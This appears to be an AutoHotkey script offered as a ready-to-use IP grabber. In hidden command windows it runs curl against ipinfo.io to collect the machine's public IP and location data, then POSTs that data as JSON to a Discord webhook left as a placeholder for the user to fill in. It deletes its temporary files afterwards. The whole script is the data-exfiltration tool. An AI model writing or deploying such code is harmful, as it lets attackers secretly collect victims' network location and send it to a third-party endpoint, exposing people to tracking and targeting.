ScriptDir := A_ScriptDir
command := "curl ipinfo.io"
RunWait %ComSpec% /c %command% > "%ScriptDir%\temp_output.txt", , Hide
FileRead, output, %ScriptDir%\temp_output.txt
FileDelete, %ScriptDir%\temp_output.txt
StringReplace, output, output, `", `\", All
jsonPayload := "{""content"": """ output """}"
jsonFile := ScriptDir "\payload.json"
FileAppend, %jsonPayload%, %jsonFile%
; replace the "REPLACE ME WITH WEBHOOK" with your webhook and it will work.
RunWait %ComSpec% /c curl -H "Content-Type: application/json" -X POST -d @"%jsonFile%" REPLACE ME WITH WEBHOOK, , Hide

FileDelete, %jsonFile%
MsgBox, The IP information has been sent to the Discord webhook.
